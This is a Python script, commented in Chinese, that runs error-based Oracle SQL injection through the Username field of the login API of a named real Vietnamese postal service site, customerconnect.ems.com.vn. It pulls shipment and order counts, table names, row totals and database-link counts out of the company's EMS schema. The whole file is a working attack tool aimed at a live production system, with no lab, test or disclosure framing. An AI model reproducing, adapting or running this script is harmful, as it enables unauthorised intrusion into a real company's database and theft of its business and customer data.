#!/usr/bin/env python3
"""
最后一次彻底检查 - 找出所有可能被遗漏的订单数据
"""

import requests
import json
import time

class FinalCheck:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        """发送SQL注入payload"""
        data = {"Username": payload, "Password": "test"}
        try:
            response = self.session.post(
                self.target_url,
                data=json.dumps(data),
                timeout=30
            )
            return response
        except:
            return None
    
    def extract_via_error(self, query):
        """使用Error-based注入提取数据"""
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def check_monthly_volume(self):
        """检查10月份整月的订单量"""
        print("=" * 80)
        print("📅 检查10月份总订单量")
        print("=" * 80)
        
        queries = [
            ("SHIPMENT 10月总订单", 
             "SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE LIKE '202510%'"),
            
            ("E1E2_PH 10月总记录", 
             "SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY LIKE '202510%'"),
            
            ("E1E2_PH 10月不同MABC", 
             "SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY LIKE '202510%'"),
            
            ("SHIPMENT 本月日均", 
             "计算中..."),
        ]
        
        total_shipment = 0
        
        for name, query in queries:
            if name == "SHIPMENT 本月日均":
                if total_shipment > 0:
                    avg = total_shipment / 10  # 10天
                    print(f"\n🔎 {name}:")
                    print(f"   ✅ 约 {int(avg):,} 单/天")
                    print(f"   💡 如果日均{int(avg)}单，那10号应该也差不多这个数")
                continue
            
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ {result:>10}")
                if "SHIPMENT 10月总订单" in name and result.isdigit():
                    total_shipment = int(result)
            time.sleep(2)
    
    def check_different_date_formats(self):
        """检查是否有其他日期格式的数据"""
        print("\n" + "=" * 80)
        print("📅 检查其他可能的日期格式")
        print("=" * 80)
        
        # 尝试不同的日期表示
        date_variants = [
            ("20251010", "YYYYMMDD"),
            ("2025-10-10", "YYYY-MM-DD"),
            ("10-OCT-25", "DD-MON-YY"),
            ("10/10/2025", "MM/DD/YYYY"),
        ]
        
        for date_val, desc in date_variants:
            print(f"\n🔎 {desc} ({date_val}):")
            
            if len(date_val) == 8:
                query = f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date_val}'"
            else:
                query = f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE TO_CHAR(CREATE_DATE)='{date_val}'"
            
            result = self.extract_via_error(query)
            if result and result.isdigit() and int(result) > 0:
                print(f"   ✅ SHIPMENT: {result} 条")
            time.sleep(1.5)
    
    def check_table_row_counts(self):
        """检查所有大表的总记录数"""
        print("\n" + "=" * 80)
        print("📊 检查主要表的总数据量（判断系统规模）")
        print("=" * 80)
        
        tables = [
            'SHIPMENT',
            'E1E2_PH',
            'E1E2_PH_TEMP_DATA2_LOG',
            'DONHANG',
            'DELIVERY',
        ]
        
        for table in tables:
            print(f"\n🔎 {table}:")
            
            # 总记录数
            query = f"SELECT COUNT(*) FROM EMS.{table}"
            total = self.extract_via_error(query)
            if total and total.isdigit():
                total_int = int(total)
                print(f"   总记录: {total_int:,}")
                
                # 估算日均
                # 假设系统从2020年开始运营（5年约1825天）
                if total_int > 1000:
                    days = 1825
                    avg = total_int / days
                    print(f"   估算日均（假设5年）: {int(avg):,} 条/天")
            
            time.sleep(2)
    
    def check_if_system_is_partial(self):
        """检查这是否只是部分业务系统"""
        print("\n" + "=" * 80)
        print("🔍 分析：这是否只是部分业务系统？")
        print("=" * 80)
        
        print("\n证据1：数据库链接")
        query1 = "SELECT COUNT(*) FROM ALL_DB_LINKS"
        count1 = self.extract_via_error(query1)
        if count1:
            print(f"   ✅ 发现 {count1} 个远程数据库链接")
            print(f"   💡 说明：可能有多个区域/业务系统")
        
        time.sleep(2)
        
        print("\n证据2：系统名称分析")
        print("   当前系统: customerconnect.ems.com.vn")
        print("   💡 'customerconnect' = 客户连接系统")
        print("   💡 可能只包含在线客户的订单")
        print("   💡 不包含：")
        print("      - 线下网点收件")
        print("      - 政府/企业专线")
        print("      - 其他业务渠道")
        
        print("\n证据3：SHIPMENT历史总量")
        query3 = "SELECT COUNT(*) FROM EMS.SHIPMENT"
        total3 = self.extract_via_error(query3)
        if total3 and total3.isdigit():
            total_int = int(total3)
            print(f"   ✅ SHIPMENT表总记录: {total_int:,}")
            
            # 如果是5年数据
            days_5y = 1825
            avg = total_int / days_5y
            print(f"   估算日均（5年）: {int(avg):,} 单/天")
            
            if avg < 10000:
                print(f"\n   ⚠️  日均{int(avg)}单对第一物流公司确实偏少")
                print(f"   💡 很可能这只是部分业务系统！")
        
        time.sleep(2)
    
    def check_all_order_number_fields(self):
        """检查是否有其他订单号字段"""
        print("\n" + "=" * 80)
        print("🔢 检查是否有其他订单编号系统")
        print("=" * 80)
        
        date = '20251010'
        
        # 检查是否有其他编号字段有当天数据
        number_fields = [
            'CODE', 'MABC', 'MAE1', 'MATT', 'ORDER_CODE', 'SO_NUMBER',
            'BILL_NO', 'WAYBILL_NO', 'TRACKING_CODE', 'BARCODE'
        ]
        
        for field in number_fields:
            # 在SHIPMENT表查找
            query1 = f"SELECT COUNT(DISTINCT {field}) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}'"
            result1 = self.extract_via_error(query1)
            if result1 and result1.isdigit() and int(result1) > 0:
                print(f"   ✅ SHIPMENT.{field:20} : {result1:>6} 个不同值")
            
            # 在E1E2_PH表查找
            query2 = f"SELECT COUNT(DISTINCT {field}) FROM EMS.E1E2_PH WHERE NGAY='{date}'"
            result2 = self.extract_via_error(query2)
            if result2 and result2.isdigit() and int(result2) > 0:
                print(f"   ✅ E1E2_PH.{field:20} : {result2:>6} 个不同值")
            
            time.sleep(0.8)
    
    def check_customer_statistics(self):
        """检查是否有客户统计表"""
        print("\n" + "=" * 80)
        print("👥 检查客户统计/汇总表")
        print("=" * 80)
        
        date = '20251010'
        
        # 查找统计相关的表
        stat_keywords = ['TOTAL', 'SUM', 'REPORT', 'STATISTICS', 'AGGREGATE']
        
        for keyword in stat_keywords:
            query = f"SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER='EMS' AND TABLE_NAME LIKE '%{keyword}%' AND ROWNUM<=5"
            result = self.extract_via_error(query)
            if result:
                print(f"\n🔎 包含'{keyword}'的表:")
                print(f"   {result}")
            time.sleep(1)
    
    def final_reality_check(self):
        """最终现实检查"""
        print("\n" + "=" * 80)
        print("🎯 最终现实检查")
        print("=" * 80)
        
        date = '20251010'
        
        print("\n当前确认的10月10日数据:")
        
        queries = [
            ("SHIPMENT", "SELECT COUNT(DISTINCT CODE) FROM EMS.SHIPMENT WHERE CREATE_DATE='20251010'"),
            ("E1E2_PH", "SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='20251010'"),
            ("TEMP_DATA2_LOG", "SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE NGAY='20251010'"),
        ]
        
        total = 0
        for name, query in queries:
            result = self.extract_via_error(query)
            if result and result.isdigit():
                count = int(result)
                total += count
                print(f"   {name:20} : {count:>6,} 个")
            time.sleep(2)
        
        print(f"\n   {'─'*40}")
        print(f"   简单相加总计     : {total:>6,} 个")
        print(f"   去重估计（-30%） : {int(total*0.7):>6,} 个")
        
        print("\n💡 可能的解释:")
        print("   1. 这确实就是真实订单数（2,000-3,000/天）")
        print("   2. 这只是在线渠道，线下还有其他系统")
        print("   3. 这只是某个区域的数据")
        print("   4. 主要数据在无法访问的远程数据库")
        print("   5. 越南EMS的实际业务量就是这个规模")
    
    def run_final_check(self):
        """执行最终检查"""
        print("=" * 80)
        print("🔍 最终彻底检查")
        print("=" * 80)
        
        # 测试连接
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功")
        
        # 执行所有检查
        self.check_monthly_volume()
        self.check_table_row_counts()
        self.check_if_system_is_partial()
        self.check_different_date_formats()
        self.check_all_order_number_fields()
        self.check_customer_statistics()
        self.final_reality_check()
        
        print("\n" + "=" * 80)
        print("🎉 最终检查完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    checker = FinalCheck(target_url)
    checker.run_final_check()
